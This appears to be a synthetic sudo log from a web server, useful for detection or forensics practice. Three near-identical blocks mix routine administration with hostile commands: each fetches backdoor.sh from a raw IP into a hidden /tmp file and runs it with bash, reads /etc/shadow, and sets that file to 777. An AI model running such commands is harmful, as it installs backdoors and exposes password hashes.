Jul 18 12:23:22 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/usr/bin/apt update
Jul 18 12:49:35 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/wget http://45.155.205.90/backdoor.sh -O /tmp/.x
Jul 18 12:49:37 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/bash /tmp/.x
Jul 18 12:49:39 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jul 18 12:49:41 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow
Jul 19 12:13:21 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/usr/bin/apt update
Jul 19 12:13:23 webserver sudo:   root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
Jul 19 12:13:25 webserver sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status app.service
Jul 19 12:13:28 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/whoami
Jul 19 12:13:30 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/wget http://45.155.205.90/backdoor.sh -O /tmp/.x
Jul 19 12:13:32 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/bash /tmp/.x
Jul 19 12:13:34 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jul 19 12:13:36 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow
Jul 19 12:38:11 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/usr/bin/apt update
Jul 19 12:38:13 webserver sudo:   root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
Jul 19 12:38:15 webserver sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status app.service
Jul 19 12:38:18 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/whoami
Jul 19 12:38:20 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/wget http://45.155.205.90/backdoor.sh -O /tmp/.x
Jul 19 12:38:22 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/bash /tmp/.x
Jul 19 12:38:24 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jul 19 12:38:26 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow
